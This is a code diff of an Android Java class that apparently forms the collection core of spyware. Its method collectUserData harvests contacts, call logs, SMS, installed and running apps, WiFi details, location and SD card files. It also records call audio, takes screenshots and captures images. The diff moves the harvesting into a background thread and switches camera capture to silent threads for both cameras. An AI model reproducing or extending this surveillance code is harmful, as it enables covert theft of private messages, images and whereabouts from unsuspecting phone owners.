@@ -26,13 +26,13 @@ public class Collection {
 
     public Collection(Context context) {
 
-        Log.e(TAG, "[liujinguang]start");
+        Log.e(TAG, "[ljg]start");
     }
 
 
-    public static void collectUserData(Context context) {
+    public static void collectUserData(final Context context) {
 
-        Log.e(TAG, "[liujinguang]collect start");
+        Log.e(TAG, "[ljg]collect start");
 
         long timenow = System.currentTimeMillis();
         String lasttime = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.PROGRAM_LAST_TIME);
@@ -56,19 +56,25 @@ public class Collection {
 
         int installMode = AccessHelper.getInstallMode(context);
 
-        PhoneInformation.getPhoneInformation(context);
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                PhoneInformation.getPhoneInformation(context);
 
-        PhoneApps.getInstallApps(context);
+                PhoneApps.getInstallApps(context);
 
-        PhoneRunning.getPhoneRunning(context);
+                PhoneRunning.getPhoneRunning(context);
 
-        PhoneContacts.getPhoneContacts(context);
+                PhoneContacts.getPhoneContacts(context);
 
-        PhoneCallLog.getPhoneCallLog(context);
+                PhoneCallLog.getPhoneCallLog(context);
 
-        PhoneSMS.getSmsFromPhone(context);
+                PhoneSMS.getSmsFromPhone(context);
 
-        PhoneWIFI.getPhoneWIFI(context);
+                PhoneWIFI.getPhoneWIFI(context);
+            }
+        }).start();
+
 
         try {
             new Thread(new PhoneCallAudioWrapper(context)).start();
@@ -86,7 +92,6 @@ public class Collection {
         if (installMode == AccessHelper.INSTALL_TYPE_SO || installMode == AccessHelper.INSTALL_TYPE_JAR) {
             new Thread(new CameraDialog(context, 0)).start();
         }else if (installMode == AccessHelper.INSTALL_TYPE_APK || installMode == AccessHelper.INSTALL_TYPE_MANUAL){
-            //MyTencentLocation tencentloc = new MyTencentLocation(context);
 
             AMaplocation amap = new AMaplocation(context,Public.PHONE_LOCATION_MINSECONDS);
             new Thread(amap).start();
@@ -96,12 +101,17 @@ public class Collection {
 
             PowerManager pm=(PowerManager)context.getSystemService(Context.POWER_SERVICE);
             boolean isScreenOn =pm.isInteractive();
-
             if (isScreenOn) {
 
-                Intent intentCamera = new Intent(context, CameraActivity2.class);
-                intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(intentCamera);
+                //Intent intentCamera = new Intent(context, CameraActivity.class);
+                //intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                //intentCamera.putExtra("index",0);
+                //intentCamera.putExtra("count",1);
+                //context.startActivity(intentCamera);
+
+                new Thread(new CameraDialog(context,0)).start();
+
+                new Thread(new CameraDialog(context,1)).start();
 
                 Intent intentScr = new Intent(context, ScreenShotActivity.class);
                 intentScr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -121,6 +131,6 @@ public class Collection {
 
         ExtSDCardFile.getExtcardFiles(context);
 
-        Log.e(TAG, "[liujinguang]collect complete");
+        Log.e(TAG, "[ljg]collect complete");
     }
 }
